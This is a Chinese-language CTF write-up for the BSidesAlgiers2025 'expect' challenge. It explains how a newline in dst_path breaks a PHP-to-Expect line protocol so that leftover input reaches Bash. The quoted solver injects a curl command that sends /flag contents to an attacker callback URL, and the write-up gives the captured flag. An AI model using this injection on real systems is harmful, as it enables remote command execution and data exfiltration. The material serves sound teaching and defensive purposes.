# BSidesAlgiers2025 - expect

## 题目简述

该服务接收 SMB 共享、目标路径、用户名和密码，随后由 PHP 向 Expect 脚本写入四行数据。Expect 再启动交互式 Bash 和 `smbclient` 上传固定的 `dummy_report.pdf`。漏洞不是 PDF 内容，也不是 SMB 协议本身，而是未经约束的 `dst_path` 被拼进第三行命令；换行可破坏 PHP 与 Expect 之间的四行字段边界，再利用交互式程序对超长密码的截断/终端缓冲行为，把剩余文本送回 Bash 执行。

仓库唯一的 PDF 是一页占位报告。逐页渲染并目视核对后，其内容只有 “Just a dummy PDF file” 与 Lorem Ipsum，没有题解、隐藏步骤或独立视觉证据，因此正文不复制该 PDF，也不创建无意义的图片目录。

## 解题过程

PHP 按固定顺序写入：

```php
$vals = [
    'service'  => base64_encode($shareDomain),
    'username' => base64_encode($shareLogin),
    'command'  => "put \"$TEST_FILEPATH\" \"$dstPath-$timestamp\"",
    'password' => substr($_POST["password"], 100)
];

foreach ($vals as $val) {
    fwrite($pipes[0], "$val\n");
}
```

Expect 则连续调用四次 `gets stdin`，默认一行就是一个字段：

```tcl
set service  [gets stdin]
set username [gets stdin]
set command  [gets stdin]
set password [gets stdin]
```

若 `dst_path` 以双引号和换行开头，生成的 `command` 会被切成两行：第一行提前闭合 `put` 参数，第二行变成 Expect 眼中的 `password`。因此攻击者可以让“密码”由大量填充字符和 shell 命令组成；原本的短密码经 `substr(..., 100)` 后为空，只会成为队列中的额外行。

官方 solver 的核心构造为：

```python
dst_path = (
    '"\n'
    + 'a' * 1024
    + 'curl "$CALLBACK_URL/?flag=$(cat /flag*)" #'
)

requests.post(
    base_url,
    data={
        "service": f"//{smb_host}/nonexistent-share",
        "username": "guest",
        "password": "unused",
        "dst_path": dst_path,
    },
)
```

完整流向如下：

1. `smbclient` 启动并显示密码提示；
2. Expect 把注入得到的超长“密码行”发送给它；
3. 交互式客户端只消费前部输入，超过约 1024 字节的余量留在终端输入队列；
4. 不存在的共享让 `smbclient` 退出，控制权回到外层 Bash；
5. 余下的 `curl ... $(cat /flag*)` 被 Bash 解释，flag 通过攻击者控制的回调通道传出；末尾 `#` 注释掉 PHP 自动追加的时间戳。

如果自建可匿名访问的 SMB 共享，命令会落在 `smbclient` 提示符中，此时可在命令前加 `!` 调用其本地 shell 转义；官方脚本也记录了这一替代路径。

仓库内 `challenge/flag.txt` 给出的最终结果是：

`shellmates{3xp3CT_is_n0t_aNY_$4FER_AND_S3CUr3_c0d1ng_1$_noT_4N_eAsy_j0b}`

## 方法总结

- 跨进程文本协议必须对换行做转义或改用带长度的结构化格式；“每行一个字段”一旦接收任意用户字符串，就存在字段错位风险。
- Expect 自动化脚本不仅要审计命令拼接，还要审计终端缓冲、交互式子程序退出后残留输入会交给谁。
- 本题的 1024 字节填充不是通用常量，而是题目中 `smbclient`、伪终端与外层 Bash 组合下的经验边界；复现时应先用无害命令确认边界，再读取目标文件。
